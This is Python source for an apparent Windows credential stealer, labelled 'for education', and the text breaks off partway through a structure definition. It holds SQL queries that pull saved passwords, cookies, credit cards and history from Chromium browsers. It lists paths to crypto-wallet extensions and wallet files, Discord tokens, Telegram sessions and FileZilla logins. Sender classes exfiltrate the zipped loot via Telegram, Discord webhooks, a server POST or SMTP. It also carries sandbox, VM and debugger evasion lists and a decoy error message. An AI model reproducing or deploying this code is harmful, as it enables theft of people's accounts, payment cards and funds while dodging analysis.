# Author Esinvoker, for education
# Don't use for damage action

#import region
#start =========
from io import BytesIO
from smtplib import SMTP
from getpass import getuser
from email.message import EmailMessage, Message

import ssl
from sys import argv
from time import sleep
from typing import List, Any
from threading import Thread
from multiprocessing import Pool
from re import findall
from typing import List
from uuid import getnode
from random import choices
from getpass import getuser
from os import path, getenv
from urllib.request import urlopen
from string import ascii_uppercase, ascii_lowercase, digits
from winreg import OpenKey, QueryInfoKey, QueryValueEx, EnumKey, HKEY_LOCAL_MACHINE, KEY_READ
from typing import List
from os import path, walk, listdir
from re import findall
from os import listdir, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
import platform
from os import path
from json import loads
from string import ascii_uppercase
from urllib.request import urlopen
from ctypes import windll, sizeof, byref, c_wchar_p
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE
from re import findall
from os import listdir, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY
from os import path
from typing import List
from ctypes.wintypes import DWORD
from ctypes import windll, sizeof, byref, create_unicode_buffer
from os import listdir, path
from base64 import b64decode
from xml.etree import ElementTree
from re import findall
from json import loads
from threading import Thread
from os import listdir, path
from urllib.request import Request, urlopen
from typing import MutableMapping, Dict
from re import compile
from base64 import b64decode
from json import load, loads
from os import path, listdir
from typing import Tuple, List
from datetime import datetime, timedelta
from sqlite3 import connect, Connection, Cursor
from ctypes import windll, byref, cdll, c_buffer
from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
from enum import Enum
from os import fsync
from struct import pack
from zlib import crc32, compress
from sys import getwindowsversion
from ctypes import POINTER, WINFUNCTYPE, c_void_p
from ctypes import WinDLL, windll, Array, c_char, create_string_buffer, sizeof
from ctypes.wintypes import BOOL, DOUBLE, DWORD, HBITMAP, HDC, HGDIOBJ, HWND, INT, LPARAM, LPRECT, RECT, UINT
from threading import Lock, current_thread, main_thread
from typing import Any, Callable, List, Optional, Tuple, Union, Dict
import copy
import struct
import ssl
from dataclasses import dataclass
from io import BytesIO
from abc import abstractmethod
from typing import Tuple, Union
from enum import Enum
from os import environ
from getpass import getuser
from re import compile, IGNORECASE, DOTALL
from typing import List, Tuple, Any
from uuid import uuid4
from sys import hexversion
from codecs import getencoder
from mimetypes import guess_type
from typing import Union, List, Tuple, BinaryIO
from collections import namedtuple
from typing import Any, Dict, Optional, Type
from io import BytesIO
from os import path, walk
from textwrap import dedent
from zipfile import ZipFile, ZIP_DEFLATED
from typing import Union, List, Tuple, AnyStr, Optional, Any
from ctypes.wintypes import DWORD, ULONG, CHAR, MAX_PATH, LONG, WORD
from ctypes import Structure, POINTER, c_char, c_ulong, c_size_t, c_wchar, c_uint32, c_ulonglong
#end =======
#global region

sys_root = environ.get("SystemRoot", r"C:\Windows")
user_profile = environ.get("USERPROFILE")
user = getuser()
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"

#

#AbstractSender Class
#start
class AbstractSender:
    """
    Template for the sender.
    """
    def __init__(self):

        self.__zip_name = None
        self.__data = None
        self.__preview = None

        self._config = SenderConfig()
        self._encoder = MultipartFormDataEncoder()

    @abstractmethod
    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of data.
        """
        ...

    @abstractmethod
    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ...

    @staticmethod
    def _create_unverified_https():
        """
        Disables SSL certificate validation.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ssl._create_default_https_context = ssl._create_unverified_context

    @abstractmethod
    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        ...
#end
class sTelegram(AbstractSender):
    """
    Sender for the Telegram.
    """
    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Telegram api url.
        """
        content_type, body = self._encoder.encode(
            [("chat_id", self.__user_id), ("caption", self.__preview)],
            [("document", f"{self.__zip_name}.zip", self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__url, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")

class sDiscord(AbstractSender):
    """
    Sender for the Discord.
    """
    def __init__(self, webhook: str):
        super().__init__()

        self.__webhook = webhook

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Discord webhook.
        """
        content_type, body = self._encoder.encode(
            [("content", self.__preview)],
            [("file", f"{self.__zip_name}.zip", self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__webhook, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Discord sender]: {repr(e)}")

class Server(AbstractSender):
    """
    Sender for the Server.
    """
    def __init__(self, server: str):
        super().__init__()

        self.__server = server

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and server route.
        """
        content_type, body = self._encoder.encode(
            [],
            [("document", f"{self.__zip_name}.zip", self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__server, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Server sender]: {repr(e)}")

class Smtp(AbstractSender):
    """
    Sender for the Email.
    """
    def __init__(self, sender_email: str, sender_password: str, recipient_email: str, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587):
        super().__init__()

        self.__sender_email = sender_email
        self.__sender_password = sender_password
        self.__recipient_email = recipient_email

        self.__smtp_server = smtp_server
        self.__smtp_port = smtp_port

    def __get_sender_data(self) -> Message:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and server route.
        """
        message = EmailMessage()
        message["From"] = self.__sender_email
        message["To"] = self.__recipient_email
        message["Subject"] = f"Stink logs from {getuser()}"

        message.set_content(self.__preview)
        message.add_attachment(
            self.__data.getvalue(), maintype="application", subtype="octet-stream", filename=rf"{self.__zip_name}.zip"
        )

        return message

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        message = self.__get_sender_data()
        server = SMTP(self.__smtp_server, self.__smtp_port)

        server.starttls()
        server.login(self.__sender_email, self.__sender_password)
        server.send_message(message)
        server.quit()

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Smtp sender]: {repr(e)}")

#Browser Class
#start
class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    BRAVE = "Brave"
    VIVALDI = "Vivaldi"
    YANDEX = "Yandex"
#end
#Class Chromerium _config
#start
class ChromiumConfig:

    BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)

    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
    BookmarksData = "Title: {0}\nUrl: {1}\n\n"

    WalletLogs = [
        {
            "name": "Metamask",
            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"]
        },
        {
            "name": "Phantom",
            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
        },
        {
            "name": "Binance",
            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
        },
        {
            "name": "Coinbase",
            "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]
        },
        {
            "name": "Trust",
            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
        },
        {
            "name": "Exodus",
            "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
        }
    ]
#end
# class MultistealerConfig
#start
class MultistealerConfig:

    PoolSize = 5
    ZipName = f"{user}-st"

    BrowsersData = {
        Browsers.CHROME: {
            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
            "process": "chrome.exe"
        },
        Browsers.OPERA_GX: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
            "process": "opera.exe"
        },
        Browsers.OPERA_DEFAULT: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
            "process": "opera.exe"
        },
        Browsers.EDGE: {
            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
            "process": "msedge.exe"
        },
        Browsers.BRAVE: {
            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "process": "brave.exe"
        },
        Browsers.VIVALDI: {
            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
            "process": "vivaldi.exe"
        },
        Browsers.YANDEX: {
            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
            "process": "browser.exe"
        },
    }
#end
#class SystemConfig
#start
class SystemConfig:

    User = user
    IPUrl = "https://ipinfo.io/json"
    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"
#end1
#class SenderConfig
#start
class SenderConfig:

    UserAgent = user_agent
#end
#Discord, Telegram SenderConfig
#start
class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    UserAgent = user_agent
    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    DataFiles = ("recentservers.xml", "sitemanager.xml")
    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"


class MessageConfig:

    MessageTitle = "0x17"
    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."

#end
# Wallets Config 
#start
class WalletsConfig:

    WalletPaths = [
        {
            "name": "Atomic",
            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb"
        },
        {
            "name": "Exodus",
            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet"
        },
        {
            "name": "Electrum",
            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets"
        },
        {
            "name": "Ethereum",
            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore"
        },
        {
            "name": "Armory",
            "path": rf"{user_profile}\AppData\Roaming\Armory"
        },
        {
            "name": "Bytecoin",
            "path": rf"{user_profile}\AppData\Roaming\bytecoin"
        },
        {
            "name": "Guarda",
            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb"
        },
        {
            "name": "Coinomi",
            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets"
        },
        {
            "name": "Zcash",
            "path": rf"{user_profile}\AppData\Local\Zcash"
        },
    ]
#end

#Protector Config
#start
class ProtectorConfig:

    MacAddresses = (
        "00:03:47:63:8b:de", "00:0c:29:05:d8:6e", "00:0c:29:2c:c1:21", "00:0c:29:52:52:50", "00:0d:3a:d2:4f:1f",
        "00:15:5d:00:00:1d", "00:15:5d:00:00:a4", "00:15:5d:00:00:b3", "00:15:5d:00:00:c3", "00:15:5d:00:00:f3",
        "00:15:5d:00:01:81", "00:15:5d:00:02:26", "00:15:5d:00:05:8d", "00:15:5d:00:05:d5", "00:15:5d:00:06:43",
        "00:15:5d:00:07:34", "00:15:5d:00:1a:b9", "00:15:5d:00:1c:9a", "00:15:5d:13:66:ca", "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8", "00:15:5d:23:4c:a3", "00:15:5d:23:4c:ad", "00:15:5d:b6:e0:cc", "00:1b:21:13:15:20",
        "00:1b:21:13:21:26", "00:1b:21:13:26:44", "00:1b:21:13:32:20", "00:1b:21:13:32:51", "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0", "00:25:90:36:65:0c", "00:25:90:36:65:38", "00:25:90:36:f0:3b", "00:25:90:65:39:e4",
        "00:50:56:97:a1:f8", "00:50:56:97:ec:f2", "00:50:56:97:f6:c8", "00:50:56:a0:06:8d", "00:50:56:a0:38:06",
        "00:50:56:a0:39:18", "00:50:56:a0:45:03", "00:50:56:a0:59:10", "00:50:56:a0:61:aa", "00:50:56:a0:6d:86",
        "00:50:56:a0:84:88", "00:50:56:a0:af:75", "00:50:56:a0:cd:a8", "00:50:56:a0:d0:fa", "00:50:56:a0:d7:38",
        "00:50:56:a0:dd:00", "00:50:56:ae:5d:ea", "00:50:56:ae:6f:54", "00:50:56:ae:b2:b0", "00:50:56:ae:e5:d5",
        "00:50:56:b3:05:b4", "00:50:56:b3:09:9e", "00:50:56:b3:14:59", "00:50:56:b3:21:29", "00:50:56:b3:38:68",
        "00:50:56:b3:38:88", "00:50:56:b3:3b:a6", "00:50:56:b3:42:33", "00:50:56:b3:4c:bf", "00:50:56:b3:50:de",
        "00:50:56:b3:91:c8", "00:50:56:b3:94:cb", "00:50:56:b3:9e:9e", "00:50:56:b3:a9:36", "00:50:56:b3:d0:a7",
        "00:50:56:b3:dd:03", "00:50:56:b3:ea:ee", "00:50:56:b3:ee:e1", "00:50:56:b3:f6:57", "00:50:56:b3:fa:23",
        "00:e0:4c:42:c7:cb", "00:e0:4c:44:76:54", "00:e0:4c:46:cf:01", "00:e0:4c:4b:4a:40", "00:e0:4c:56:42:97",
        "00:e0:4c:7b:7b:86", "00:e0:4c:94:1f:20", "00:e0:4c:b3:5a:2a", "00:e0:4c:b8:7a:58", "00:e0:4c:cb:62:08",
        "00:e0:4c:d6:86:77", "06:75:91:59:3e:02", "08:00:27:3a:28:73", "08:00:27:45:13:10", "12:1b:9e:3c:a6:2c",
        "12:8a:5c:2a:65:d1", "12:f8:87:ab:13:ec", "16:ef:22:04:af:76", "1a:6c:62:60:3b:f4", "1c:99:57:1c:ad:e4",
        "1e:6c:34:93:68:64", "2e:62:e8:47:14:49", "2e:b8:24:4d:f7:de", "32:11:4d:d0:4a:9e", "3c:ec:ef:43:fe:de",
        "3c:ec:ef:44:00:d0", "3c:ec:ef:44:01:0c", "3c:ec:ef:44:01:aa", "3e:1c:a1:40:b7:5f", "3e:53:81:b7:01:13",
        "3e:c1:fd:f1:bf:71", "42:01:0a:8a:00:22", "42:01:0a:8a:00:33", "42:01:0a:8e:00:22", "42:01:0a:96:00:22",
        "42:01:0a:96:00:33", "42:85:07:f4:83:d0", "4e:79:c0:d9:af:c3", "4e:81:81:8e:22:4e", "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08", "52:54:00:a0:41:92", "52:54:00:ab:de:59", "52:54:00:b3:e4:71", "56:b0:6f:ca:0a:e7",
        "56:e8:92:2e:76:0d", "5a:e2:a6:a4:44:db", "5e:86:e4:3d:0d:f6", "60:02:92:3d:f1:69", "60:02:92:66:10:79",
        "7e:05:a3:62:9c:4d", "90:48:9a:9d:d5:24", "92:4c:a8:23:fc:2e", "94:de:80:de:1a:35", "96:2b:e9:43:96:76",
        "a6:24:aa:ae:e6:12", "ac:1f:6b:d0:48:fe", "ac:1f:6b:d0:49:86", "ac:1f:6b:d0:4d:98", "ac:1f:6b:d0:4d:e4",
        "b4:2e:99:c3:08:3c", "b4:a9:5a:b1:c6:fd", "b6:ed:9d:27:f4:fa", "be:00:e5:c5:0c:e5", "c2:ee:af:fd:29:21",
        "c8:9f:1d:b6:58:e4", "ca:4d:4b:ca:18:cc", "d4:81:d7:87:05:ab", "d4:81:d7:ed:25:54", "d6:03:e4:ab:77:8e",
        "ea:02:75:3c:90:9f", "ea:f6:f1:a2:33:76", "f6:a5:41:31:b2:78"
    )

    Computers = (
        "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH",
        "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        "NETTYPC", "DESKTOP-BUGIO", "DESKTOP-CBGPFEE", "SERVER-PC", "TIQIYLA9TW5M", "DESKTOP-KALVINO", "COMPNAME_4047",
        "DESKTOP-19OLLTD", "DESKTOP-DE369SE", "EA8C2E2A-D017-4", "AIDANPC", "LUCAS-PC", "ACEPC", "MIKE-PC",
        "DESKTOP-IAPKN1P", "DESKTOP-NTU7VUO", "LOUISE-PC", "T00917", "test42", "DESKTOP-CM0DAW8"
    )

    Users = (
        "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH",
        "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "WDAGUtilityAccount",
        "ink", "RDhJ0CNFevzX", "kEecfMwgj", "8Nl0ColNQ5bq", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b",
        "PqONjHVwexsS", "3u2v9m8", "HEUeRzl", "BvJChRPnsxn", "SqgFOf3G", "h7dk1xPr", "RGzcBUyrznReg", "OgJb6GqgK0O",
        "4CrA8IZTwHZe", "abhcolem", "28DnZnMtF0w", "4qZR8", "a7mEbvN6", "w5lwDo8hdU24", "ZGuuuZQW"
    )

    Tasks = (
        "ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "regedit.exe", "cmd.exe",
        "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe",
        "vmwaretray.exe", "vmwareservice.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe",
        "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe",
        "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe",
        "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe",
        "32dbg.exe", "64dbg.exe", "protection_id.exe", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe",
        "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe",
        "ollydbg.exe", "fakenet.exe", "dumpcap.exe"
    )

    Cards = (
        "virtualbox", "vmware"
    )

    RegistryEnums = (
        "vmware", "qemu", "virtio", "vbox", "xen", "VMW", "Virtual"
    )

    Dlls = (
        rf"{sys_root}\System32\vmGuestLib.dll",
        rf"{sys_root}\vboxmrxnp.dll"
    )

    IPUrl = "http://ip-api.com/line/?fields=hosting"

#end
@dataclass
class Field:
    name: str = ""
    value: Any = 0


@dataclass
class Data:
    files: List[Tuple]
    fields: List[Field]
#from typing import List, Any, Tuple

#from stink.helpers.dataclasses import Data


def create_table(header: List[Any], rows: List[Any]) -> str:
    """
    Generates a table from the data.

    Parameters:
    - header [list]: List of header columns.
    - rows [list]: List of rows.

    Returns:
    - str: A rendered table with data.
    """
    num_columns = len(rows[0])
    col_widths = [max(len(str(header[i])), *(len(str(row[i])) for row in rows)) for i in range(num_columns)]

    horizontal_border = '+' + '+'.join(['-' * (width + 2) for width in col_widths]) + '+'
    header_row = '|' + '|'.join([' ' + str(header[i]).ljust(col_widths[i]) + ' ' for i in range(num_columns)]) + '|'

    yield horizontal_border
    yield header_row
    yield horizontal_border

    for row in rows:
        yield '|' + '|'.join([' ' + str(row[i]).ljust(col_widths[i]) + ' ' for i in range(num_columns)]) + '|'
        yield horizontal_border


def run_process(process: Any, arguments: Tuple = None) -> Data:
    """
    Starts the process.

    Parameters:
    - process [any]: Class object.
    - arguments [tuple]: Tuple of arguments for process.

    Returns:
    - List: List of collected files.
    """
    if not arguments:
        return process.run()

    return process(*arguments).run()
#class MultipartFormDataEncoder
#start 
class MultipartFormDataEncoder(object):
    """
    Creates a multipart/form-data content type.
    """

    def __init__(self):
        self.__boundary = uuid4().hex

    @classmethod
    def u(cls, string: Union[str, bytes]) -> str:
        """
        Decodes the string.

        Parameters:
        - string [str|bytes]: String or bytes to be decoded.

        Returns:
        - str: Decoding result.
        """
        if hexversion < 0x03000000 and isinstance(string, str):
            string = string.decode("utf-8")

        if hexversion >= 0x03000000 and isinstance(string, bytes):
            string = string.decode("utf-8")

        return string

    def iter(self, fields: List[Tuple[str, Union[str, int]]], files: List[Tuple[str, str, Union[BinaryIO, BytesIO]]]) -> str:
        """
        Writes fields and files to the body.

        Parameters:
        - fields [list]: Fields for writing.
        - files [list]: Files for writing.

        Returns:
        - str: Result of file processing.
        """
        encoder = getencoder("utf-8")

        for (key, value) in fields:

            key = self.u(key)

            yield encoder(f"--{self.__boundary}\r\n")
            yield encoder(self.u(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'))

            if isinstance(value, int) or isinstance(value, float):
                value = str(value)

            yield encoder(self.u(f"{value}\r\n"))

        for (key, filename, filedata) in files:

            key = self.u(key)
            filename = self.u(filename)

            yield encoder(f"--{self.__boundary}\r\n")
            yield encoder(self.u(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'))
            yield encoder(f"Content-Type: {guess_type(filename)[0] or 'application/octet-stream'}\r\n\r\n")

            if type(filedata) is BytesIO:
                buffer = filedata.getvalue()
            else:
                buffer = filedata.read()

            yield buffer, len(buffer)
            yield encoder("\r\n")

        yield encoder(f"--{self.__boundary}--\r\n")

    def encode(self, fields: List[Tuple[str, Union[str, int]]], files: List[Tuple[str, str, BinaryIO]]) -> Tuple[str, bytes]:
        """
        Converts specified files and fields to multipart/form-data format.

        Parameters:
        - fields [list]: Fields for converting.
        - files [list]: Files for converting.

        Returns:
        - tuple: Multipart/form-data file representation.
        """
        try:

            body = BytesIO()

            for chunk, chunk_len in self.iter(fields, files):
                body.write(chunk)

            return f"multipart/form-data; boundary={self.__boundary}", body.getvalue()

        except Exception as e:
            print(f"[Form]: {repr(e)}")
#end
class MemoryStorage:
    """
    Creates a storage in the memory.
    """
    def __init__(self):
        self.__buffer = BytesIO()
        self.__files = []
        self.__counts = []

    def add_from_memory(self, source_path: str, content: Union[str, bytes]) -> None:
        """
        Adds a file to the list of files.

        Parameters:
        - source_path [str]: File name or path inside the archive.
        - content [str|bytes]: File content.

        Returns:
        - None.
        """
        self.__files.append((source_path, content))

    def add_from_disk(self, source_path: str, zip_path: Optional[str] = None) -> None:
        """
        Adds a file path to the list of files.

        Parameters:
        - source_path [str]: File name or path to be copied.
        - zip_path [str]: Path to the file or folder in the archive.

        Returns:
        - None.
        """
        if path.isfile(source_path):
            if zip_path:
                self.__files.append((zip_path, open(source_path, "rb").read()))
            else:
                self.__files.append((path.basename(source_path), open(source_path, "rb").read()))

        elif path.isdir(source_path):
            for folder_name, _, file_names in walk(source_path):
                for file_name in file_names:
                    try:
                        file_path = path.join(folder_name, file_name)
                        name_in_zip = path.relpath(file_path, source_path)

                        if zip_path:
                            name_in_zip = path.join(zip_path, name_in_zip)

                        self.__files.append((name_in_zip, open(file_path, "rb").read()))
                    except Exception as e:
                        print(f"[Storage]: Error while copying a file {file_name} - {repr(e)}")
        else:
            print("[Storage]: The file is unsupported.")

    def add_data(self, name: str, data: Any) -> None:
        self.__counts.append(Field(name, data))

    @staticmethod
    def create_preview(fields: List[Field]) -> str:
        """
        Creates a preview of the collected data.

        Parameters:
        - fields [list]: List of fields with data.

        Returns:
        - None.
        """
        computer = {
            "User": "Unknown",
            "IP": "Unknown",
            "OS": "Unknown"
        }
        browsers = {
            "Cookies": 0,
            "Passwords": 0,
            "History": 0,
            "Bookmarks": 0,
            "Extensions": 0,
            "Cards": 0
        }
        applications, wallets, grabbers = [], [], []

        for field in fields:
            name, value = field.name, field.value

            if name in computer.keys():
                computer[name] = value

            elif name in browsers.keys():
                browsers[name] += value

            elif name in ["Telegram", "Discord", "FileZilla", "Steam"] and value:
                applications.append(name)

            elif name in ["Wallets"]:
                wallets.append(value)

            elif name in ["Grabber"]:
                grabbers.append(value)

        applications = ", ".join(applications) if applications else "No applications found"
        wallets = ", ".join(wallets) if wallets else "No wallets found"
        grabbers = ", ".join(grabbers) if grabbers else "No grabbed files found"

        preview = dedent(f'''
        🖥️ User: {computer["User"]}
        🌐 IP: {computer["IP"]}
        📋 OS Name: {computer["OS"]}
        
        🍪 Cookies: {browsers["Cookies"]}
        🔒 Passwords: {browsers["Passwords"]}
        📖 History: {browsers["History"]}
        📚 Bookmarks: {browsers["Bookmarks"]}
        📦 Extensions: {browsers["Extensions"]}
        💳 Cards: {browsers["Cards"]}
        
        📁 Other applications:
        {applications}
        
        💸 Crypto wallets:
        {wallets}
        
        📝 Grabbed files:
        {grabbers}
        ''')

        return preview

    def get_data(self) -> Data:
        """
        Returns the contents of the archive.

        Parameters:
        - None.

        Returns:
        - None.
        """
        return Data(self.__files, self.__counts)

    def create_zip(self, files: Optional[List[Tuple[str, AnyStr]]] = None) -> BytesIO:
        """
        Adds files from a list of data returned by get_data method of other MemoryStorage objects into one archive.

        Parameters:
        - files [list]: List of files for creating the archive.

        Returns:
        - BytesIO: BytesIO object.
        """
        if files is None:
            files = self.__files

        with ZipFile(self.__buffer, mode='w', compression=ZIP_DEFLATED) as zip_file:
            for file_name, content in files:
                zip_file.writestr(file_name, content)

        self.__buffer.seek(0)
        return self.__buffer
class DataBlob(Structure):
    _fields_ = [
        ("cbData", DWORD),
        ("pbData", POINTER(c_char))
    ]


class ProcessEntry32(Structure):
    _fields_ = [
        ("dwSize", DWORD),
        ("cntUsage", DWORD),
        ("th32ProcessID", DWORD),
        ("th32DefaultHeapID", POINTER(ULONG)),
